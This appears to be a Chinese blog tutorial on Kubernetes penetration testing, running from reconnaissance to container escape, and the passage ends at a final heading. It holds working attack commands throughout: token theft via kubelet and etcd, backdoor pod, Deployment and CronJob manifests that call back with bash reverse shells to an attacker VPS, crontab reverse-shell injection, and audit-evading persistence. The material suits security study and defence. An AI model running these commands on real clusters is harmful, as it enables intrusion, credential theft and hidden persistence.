---
title: "K8s渗透入门从零到一"
date: 2025-01-01T00:00:00+08:00
draft: false
---

# K8s渗透从0到1

文章首发于track安全社区：[K8s渗透入门从零到一](https://bbs.zkaq.cn/t/32483.html)

## k8s基础

### k8s架构

Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台

k8s基本架构如下（图片的scheduler打错了，特此更正）：
![QQ_1752397186606](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png)

从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点

**master节点**主要有以下核心组件：

- etcd 保存了整个集群的状态
- API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制
- Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等
- Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上

**node节点**有以下核心组件：

- Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份

- Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
- Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
- pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
- fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。

Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源

这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器

![image-20250713220938432](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png)

### k8s特点

和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理

k8s具有如下的特点：

* 自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启

* 弹性伸缩：容器数量的控制

* 自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新

* 服务发现和负载均衡：默认方案

* 机密和配置管理：对敏感数据或其他进行配置管理

* 存储编排：虚拟磁盘与物理磁盘

* 批处理：批量任务实现

### k8s工作流程

> kubectl 是 k8s 的客户端工具，可以使用命令行管理集群

**用户端命令下发通常流程如下：**

* kubectl向apiserver发送部署请求（例如使用 kubectl create -f deployment.yml）
* apiserver将 Deployment 持久化到etcd；etcd与apiserver进行一次http通信
* controller manager通过watch api监听 apiserver ，deployment controller看到了一个新创建的deplayment对象更后，将其从队列中拉出，根据deployment的描述创建一个ReplicaSet并将 ReplicaSet 对象返回apiserver并持久化回etcd
* 接着scheduler调度器看到未调度的pod对象，根据调度规则选择一个可调度的节点，加载到pod描述中nodeName字段，并将pod对象返回apiserver并写入etcd
* kubelet在看到有pod对象中nodeName字段属于本节点，将其从队列中拉出，通过容器运行时创建pod中描述的容器

------

接下来按照信息搜集、初始访问、执行、持久化、权限提升、横向移动的顺序来讲解k8s的攻防知识

## 0.信息搜集

这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网

k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico

而通信类型存在4种：

* 同一pod内的容器间通信
* 不同pod间的通信
* pod与service间的通信
* 集群外部的流量与service间的通信

### shell环境辨别

如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，一些常用命令：

~~~sh
ps aux
ls -l .dockerenv
capsh --print
env | grep KUBE
ls -l /run/secrets/kubernetes.io/
mount
df -h
cat /proc/1/cgroup
cat /etc/resolv.conf
cat /etc/mtab
cat /proc/self/status
cat /proc/self/mounts
cat /proc/net/unix
cat /proc/1/mountinfo
~~~

这里的`cat /proc/1/cgroup`是分辨容器环境一个很实用的命令：

没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：

~~~
12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36
~~~

而k8s默认的cgroup信息格式如下：

~~~
12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197
~~~

### 特权相关搜集

另外`capsh --print`获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限：
![QQ_1751874769526](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751874769526.png)

那如果没有capsh命令且无法安装怎么办呢？

* 首先`cat /proc/1/status` 获取到 Capabilities hex 记录:

  ![QQ_1751875341210](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875341210.png)

* 然后在我们自己安装了capsh的主机上进行decode：

  ![QQ_1751875475273](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875475273.png)

如此即可达到代替`capsh --print`的效果

### APIServer相关

有时候虽然获得了可以访问 APIServer 的网络权限和证书（又或者不需要证书）拥有了控制集群资源的权限，却无法下载或安装一个 kubectl 程序便捷的和 APIServer 通信，此时我们可以配置 kubectl 的 logging 登记，记录本地 kubectl 和测试 APIServer 的请求详情，并将相同的请求包发送给目标的 APIServer 以实现相同的效果

~~~sh
kubectl create -f cronjob.yaml -v=8
~~~

如果需要更详细的信息，也可以提高 logging level, 例如 kubectl -v=10 等，其他 Kubernetes 组件也能达到相同的目的

### 端口相关搜集

在内网信息搜集时，还可以留意一些k8s相关端口：

* kube-apiserver: 6443, 8080
* kubectl proxy: 8080, 8081
* kubelet: 10250, 10255, 4149
* dashboard: 30000
* docker api: 2375
* etcd: 2379, 2380
* kube-controller-manager: 10252
* kube-proxy: 10256, 31442
* kube-scheduler: 10251
* weave: 6781, 6782, 6783
* kubeflow-dashboard: 8080

## 1.初始访问

初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限

### APIServer未授权

#### insecure-port开启

典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权

如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：

直接访问8080端口，会返回可用的API列表：

![QQ_1751982848150](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751982848150.png)

接下来需要用到kubectl，安装教程见[官网](https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/?spm=a2c6h.12873639.article-detail.17.27ea1f40XfNqrj#install-using-native-package-management)

使用kubectl可以获取集群信息：

~~~sh
kubectl -s [ip]:[port] get nodes
~~~

![QQ_1752384616909](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384616909.png)

上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod

#### secure-port开启匿名访问

即6443安全端口的未授权访问

若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为`system:anonymous`用户。

一般来说`system:anonymous`用户权限是很低的，但是如果运维人员管理失当，把`system:anonymous`用户绑定到了`cluster-admin`用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:

![QQ_1752426203178](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426203178.png)

我们可以通过kubectl进行apiserver调用：

```
kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info
```

![QQ_1752426404993](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426404993.png)

当然有可能会遇到这种情况：

![QQ_1752426467047](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426467047.png)

这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：

![QQ_1752426612745](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426612745.png)

当然有个很好用的工具叫**cdk**也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：

![QQ_1752426961861](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426961861.png)

在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问`/api/v1/namespaces/default/secret`路由来尝试获取用户token：

![QQ_1754839911396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754839911396.png)

我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：

~~~sh
kubectl auth can-i --list --server=https://119.8.60.88:6443 --token="<token值>" --insecure-skip-tls-verify
~~~

![QQ_1752504397042](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752504397042.png)

这里可以看到权限非常高

打法和不安全端口8080未授权类似，这里不再细说

### kubectl proxy暴露

通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网

所以利用方式和apiserver未授权类似，这里不再细说

### kubelet未授权

kubelet和kubectl的区别？

kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod

每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口

如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用

> 例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸

通过请求接口执行命令读取token：

~~~sh
curl -XPOST -k "https://${K8S}:10250/run/<namespace>/<pod>/<container>" -d "cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token"
~~~

### etcd未授权

k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳

etcd分为v2和v3两个大版本，打法也各不相同：

#### etcd v2

Kubernetes ≤ 1.5的版本默认使用etcd v2，打法一般是直接通过网页访问来获取key-value的信息：

~~~
http://127.0.0.1:2379/v2/keys/?recursive=true
~~~

但感觉很少遇到有用的信息：

![QQ_1752764813479](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752764813479.png)

#### etcd v3

从k8s v1.6 开始，就默认使用 etcd v3，一般使用etcdctl实现对etcd的访问

比如这里我们尝试读取etcd中存储的相关信息：

~~~
./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only
~~~

![QQ_1753529396622](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753529396622.png)

我们也可以通过匹配secrets关键字来寻找token相关信息：

~~~
./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only | grep /secrets/
~~~

![QQ_1753529300887](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753529300887.png)

可以看到这里就有很多token信息

比如我们读取bootstrap-token：

![QQ_1752770169058](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752770169058.png)

获得token后，我们可以在APIserver查看当前token权限：

~~~sh
./etcdctl --token=<token> --server=x.x.x.x:6443 --insecure-skip-tls-verify auth can-i --list
~~~

![QQ_1752769661978](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752769661978.png)

可见这里这个bootstrap-token的权限就比较低

### kubeconfig文件泄漏

kubeconfig文件是用于配制集群访问的文件，该文件用来组织有关集群、用户、命名空间和身份认证机制的信息，包括集群的apiserver地址和登录凭证，如果攻击者获取到该文件，就可以使用该凭证访问k8s集群

比如node节点上就存储了kubeconfig文件：

~~~sh
cat /root/.kube/config
# 或
cat /etc/kubernetes/kubelet.conf
~~~

![QQ_1753639624750](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753639624750.png)

我们可以将config复制到我们自己的vps上，并且把这个config中server的值从本地url改为外网地址：
![QQ_1754241005724](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754241005724.png)

接下来可以通过kubect指定config文件来控制apiserver了：

~~~sh
kubectl --kubeconfig config get pods
~~~

![image-20250804011913966](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250804011913966.png)

### K8s Dashboard 未授权

k8s Dashboard是一个基于web的k8s用户界面，可以对k8s进行可视化管理

正常的k8s面板应该像这样，只允许使用bearer token登录：
![QQ_1754818190889](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818190889.png)

或者还允许使用kubeconfig文件登录：

![QQ_1754818282686](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818282686.png)

但如果用户配置错误，会导致可以跳过认证阶段：

![QQ_1754818442435](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818442435.png)

只需要点击跳过，就能够进入dashboard的管理界面：

![QQ_1754818556792](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818556792.png)

但我们这样使用的其实是dashboard默认服务账户：

![QQ_1754818889632](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818889632.png)

该账户在默认情况下也不能达到控制集群的目的，但有些开发者会为了方便，将kubernets-dashboard账号绑定cluster-admin集群管理员角色，就这样就会使其拥有集群最高权限，那么我们就可以通过创建恶意pod来一步步接管集群：

![QQ_1754819546555](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754819546555.png)

### 总结

可以看出，其实初始访问的入口都是配置不当导致的未授权，这些未授权存在于各个不同的端口，所以我们可以对这些端口多加留意

## 2.执行

执行阶段的主要任务是实现在集群内执行任意命令，获得shell

### kubectl exec进入容器

当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：

~~~sh
# apiserver未授权时
kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash

# 获取到kubeconfig文件时
kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash

# 获取到高权限token时
kubectl --server=https://x.x.x.x:6443 --token="<token值>" --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash
~~~

比如这里进入容器执行反弹shell命令

![QQ_1755101935584](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png)

成功监听到反弹shell：

![QQ_1755101972156](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png)

### 创建后门pod

获取初始访问权限后，通过创建后门pod来执行后续攻击，

首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：

~~~yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-rev
spec:
  nodeName: <节点名称>
  containers:
  - name: test-container
    image: ubuntu
    command: ["/bin/sh"]
    args:
      - "-c"
      - |
        apt update && apt install -y bash netcat-openbsd && \
        bash -c 'while true; do bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1; sleep 60; done'
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
    securityContext:
      privileged: true
  volumes:
  - name: test-volume
    hostPath:
      path: /
~~~

然后使用 kubectl 创建文件指定的恶意容器：

~~~
kubectl -s x.x.x.x:8080 create -f test.yaml
~~~

![QQ_1752337573510](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337573510-20250714002417620.png)

>**注意**，这里如果想要指定在哪个node上创建容器（只有状态为ready的node可以创建并running），可以直接在yaml中增加nodeName字段：
>
>~~~yaml
>spec:
>nodeName: <节点名称>
>~~~
>
>我们其实也可以通过上面提到的kubectl exec直接进入容器的shell：
>
>~~~sh
>kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash
>~~~

在创建成功后，容器会自动向我们监听的vps反弹shell：

![QQ_1752337659881](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337659881-20250714002417907.png)

因为我们将节点的根目录挂载到了容器的`/mnt`目录，所以我们可以通过操作pod的`/mnt`目录来操作node的根目录：

![QQ_1752337790318](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714002609563.png)

### 服务账号连接API Server执行指令

k8s的账号分为用户账号和服务账号，用户账号提供给用户来操作集群，服务账号用于pod中运行的进程，为pod中运行的应用或服务提供身份，由k8s API自动创建并由API server进行认证，k8s的pod中默认携带服务账号的访问凭证，每个服务账号均会自动关联一个API访问令牌，那么如果我们控制的pod中存在高权限的服务账号，我们就可以在pod中通过该账号凭证向k8s下发指令

服务账号在pod内的默认路径如下：

~~~sh
/var/run/secrets/kubernetes.io/serviceaccount/
~~~

![QQ_1755186066353](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755186066353.png)

我们可以携带这里的token向apiserver发送一个SelfSubjectRulesReview请求，可以知道当前服务账号在指定命名空间（这里以default为例）的操作权限：

~~~sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -sk --header "Authorization: Bearer $TOKEN" --cacert $CA_CERT -H "Content-Type: application/json" -X POST https://x.x.x.x:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
~~~

![QQ_1755339078336](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755339078336.png)

如果返回的json中列出来是较高的权限，我们可以使用这个服务账户的token来远程控制apiserver（网传可以curl请求apiserver的借口来执行命令，但我失败了，似乎是因为这里不能使用常规http来请求借口，而需要SPDY或者websocket，所以我认为使用kubectl来完成对kubectl的控制更方便）：

![QQ_1755343454008](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755343454008.png)

那么后面的操作就和上文一样，可以创建后门pod并挂载node根目录实现对node节点的访问或者逃逸（逃逸在后面的文章总结）

### 未开启RBAC权限

RBAC(Role-Based Access Control)是k8s中用于控制访问权限的一种策略，它允许管理员定义角色和角色绑定，以及分配这些角色给用户或服务账号，以此来限制他们对集群的访问和操作权限

我们可以通过在master节点上执行命令，查看apiserver的启动参数是否有`--authorization-mode=RBAC`，以此查看是否开启了RBAC权限：

~~~sh
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization-mode
~~~

![QQ_1755358930320](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755358930320.png)

或者：

~~~sh
ps -ef | grep authorization-mode
~~~

![QQ_1755359606268](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755359606268.png)

只要有这个参数，则代表开启了RBAC权限

如果没有开启RBAC权限，代表我们可以使用k8s中任意经过认证的token实现对k8s apiserver的控制，那么思路就和上面连接API server执行是一样的了，当我们获得了pod的shell，可以尝试读取`/var/run/secrets/kubernetes.io/serviceaccount/token`获得token，然后直接使用curl或者kubectl调用apiserver，创建后门pod并逃逸来控制节点

### 不安全的容器镜像

如果容器本身存在漏洞，则很容易成为入口点，比如笔者遇到过的一个攻防场景，pod上运行的zabbix在公网存在弱口令，进入后台可以RCE导致pod被接管，后续进行一系列横向和逃逸，成功接管了整个k8s

### 总结

从上面的这些方法来看，执行这一步的目标就利用传统安全漏洞、token、apiserver原有命令等手段，在pod上实现命令执行或者能够获得apiserver的控制权，为接下来的权限提升（即逃逸）做准备

## 3.持久化

持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权

### 部署后门容器

在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）

常见方法如下

#### 挂载目录

向创建的pod中挂载一些用于逃逸的目录，在后面权限提升部分的笔记中详细记录了

这里值得一提的是，我们可以在yaml中使用这个配置：

~~~yaml
restartPolicy: Always
~~~

可以让pod在被关闭后重启

#### 使用k8s控制器部署后门容器

在前面执行部分的笔记中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：

~~~yaml
kind: Pod
~~~

这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：

~~~yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-rev
spec:
  replicas: 1
  selector:
    matchLabels:
      app: test-rev
  template:
    metadata:
      labels:
        app: test-rev
    spec:
      nodeName: <节点名称>
      containers:
      - name: test-container
        image: ubuntu
        command: ["/bin/sh"]
        args:
          - "-c"
          - |
            apt update && apt install -y bash netcat-openbsd && \
            bash -c 'while true; do bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1; sleep 60; done'
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
        securityContext:
          privileged: true
      volumes:
      - name: test-volume
        hostPath:
          path: /
~~~

指定yaml文件即可创建：

![QQ_1757005961855](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757005961855.png)

可以通过如下命令可以查看我们部署的控制器：

~~~sh
kubectl get deployments
~~~

![QQ_1757006424193](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006424193.png)

通过deployment部署的pod即使被删除也能自动重建：

![QQ_1757006371754](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006371754.png)

如果要删除这个控制器，命令如下：

~~~sh
kubectl delete deployment test-rev
~~~

#### cronjob持久化

cronjob的作用类似于linux上的crontab，会创建基于时间间隔重复的调度job

job控制器也是k8s的一种内置控制器，用于运行一个或多个Pod来执行任务，yaml文件格式如下：

~~~yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: test-rev-cron
spec:
  schedule: "*/1 * * * *"   # 每分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          nodeName: <节点名称>
          restartPolicy: Never
          containers:
          - name: test-container
            image: ubuntu
            command: ["/bin/sh"]
            args:
              - "-c"
              - |
                apt update && apt install -y bash netcat-openbsd && \
                bash -c 'bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1'
            volumeMounts:
            - mountPath: /mnt
              name: test-volume
            securityContext:
              privileged: true
          volumes:
          - name: test-volume
            hostPath:
              path: /
~~~

创建方法也是一样的：

![QQ_1757130951640](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130951640.png)

创建后可以查看是否创建成功：

~~~sh
kubectl --kubeconfig config get cronjob -A
~~~

创建后就可以每分钟收到一次反弹shell：

![QQ_1757130993297](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130993297.png)

删除也很简单：

~~~sh
kubectl delete cronjob test-rev-cron
~~~

![QQ_1757131261273](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757131261273.png)

### 在容器/镜像内植入后门

#### 容器植入后门

这里的即对pod容器进行一些基础的维持，方法和常规linux权限维持相似，这里不再赘述

#### 向镜像植入后门

如果获取了私有镜像仓库的控制权限，我们便可以尝试向镜像注入恶意代码，常见的方法是修改dockerfile文件，在里面植入恶意的sh命令

### 修改核心文件访问权限

当我们获得了master节点的权限后，也可以通过修改apiserver配置文件来修改组件的访问权限，常用方式如下：

* 开启apiserver不安全端口或安全端口匿名访问
* 配置kubelet 10250端口未授权访问
* 配置etcd未授权
* 配置kube proxy apiserver监听其他端口

### 伪装系统Pod

kube-system是k8s系统相关的所有对象组成的命名空间，包含很多用于管理集群的组件：

![QQ_1757144377550](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757144377550.png)

一般来说这些组件是不会被查看和修改的，所以我们可以在这里面伪造一个系统pod，pod创建的方法和前面一样，只是名字和指定的namespace不同，这里不再赘述

### 部署静态pod

static 是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：

* 仅依赖于 kubelet：Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用，在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器宿主机节点之上

* 配置目录固定：Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为  /etc/kubernetes/manifests 或  /etc/kubelet.d/，一般情况不做更改。需要注意的是，不同Kubernetes发行版的默认路径可能有所不同，建议在实际环境中进行确认

我们只需要在配置目录如`/etc/kubernetes/manifests`中添加恶意pod的yaml文件即可

我们可以查看`/etc/systemd/system/kubelet.service.d/10-config.conf`中是否有这个配置：

![QQ_1757146611800](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757146611800.png)

没有配置我们可以手动启动这个配置：

~~~sh
kubelet --pod-manifest-path=/etc/kubernetes/manifests
~~~

或在上面截图中的`/var/lib/kubelet/config.yaml`文件中添加一行：

~~~yaml
staticPodPath: /etc/kubernetes/manifests
~~~

### 创建shadow apiserver

思路是创建一个具有apiserver功能的pod，后续命令可以在这个影子apiserver上进行下发，可以绕过k8s的日志审计，不会被原apiserver记录，更加隐蔽

我们可以使用CDK实现，可以看原wiki：https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver

~~~sh
./cdk run k8s-shadow-apiserver default
~~~

shadow apiserver会开启未授权端口，部署完成后我们可以通过kubectl或cdk的kcurl向shadow apiserver下发请求

### k0otkit

绿盟的阮博男师傅分享了一种k8s内的rootkit技术：https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/

从攻击者的角度来看，k0otkit利用了多种技术和天然优势：

1. DaemonSet和Secret资源（快速持续反弹、资源分离）
2. kube-proxy镜像（就地取材）
3. 动态容器注入（高隐蔽性）
4. Meterpreter（流量加密、持续反弹）
5. 无文件攻击（高隐蔽性）

这个rootkit除了用于权限维持以外，在我们获得master节点的cluster-admin权限也可以用来快速获取所有节点shell，具体的使用方法可以参考github：https://github.com/Metarget/k0otkit

## 4.权限提升

一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。

### RBAC权限滥用

类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务

### 部署静态pod

这个方法在前面持久化的笔记中已经介绍过了，这里不再赘述

### 利用容器不安全配置提权

即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别

#### 挂载目录逃逸

挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接参考docker逃逸的手法，在我的这篇文章提到过：[Docker逃逸手法大全](https://www.cnblogs.com/yuy0ung/articles/18819294) ，这里提一个最简单的挂载根目录：

比如我们创建恶意pod的时候，根目录挂载到了容器的`/mnt`目录，所以在获取了pod的shell后，我们可以通过查看pod的`/mnt`目录来访问查看node的根目录：

![QQ_1752337790318](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png)

接下来可以通过写定时任务来获取node的shell：

~~~sh
echo -e "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/<vps的公网IP>/4444 0>&1 & disown  '" >> /mnt/etc/crontab
~~~

>注意，这里并没有直接使用`sh -i > /dev/tcp/<IP>/4444 2>&1`，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持`>&`语法，上面的yaml文件中反弹shell的payload同理

我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：

![QQ_1752384892469](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png)

这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：
![QQ_1752342324537](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png)

不过通过查阅资料发现原因可能和busybox的情况类似，对`-i`即交互参数支持不完整，那么我们可以尝试使用`disown`命令让我们反弹shell的进程不受父shell进程影响而exit：

```
echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1 & disown'" >> /mnt/etc/crontab
```

![QQ_1752384977729](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png)

此时我们就可以接收到反弹的shell并且不会断开了：
![QQ_1752344803661](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png)

#### 持久化挂载docker.sock

挂载docker socket逃逸同样在我写的 [Docker逃逸手法大全](https://www.cnblogs.com/yuy0ung/articles/18819294) 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：

~~~sh
./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
~~~

#### 容器特权逃逸

同样在 [Docker逃逸手法大全](https://www.cnblogs.com/yuy0ung/articles/18819294) 里详细介绍了，值得一题的是关于特权信息搜集时的小技巧，在前面信息搜集部分已经讲过了

### 容器基础应用或容器编排平台漏洞

#### docker漏洞

即docker逃逸的一些历史CVE，基本和docker的runc、containerd等容器相关

#### k8s漏洞

即k8s容器逃逸的一些历史CVE

### 利用linux内核漏洞逃逸

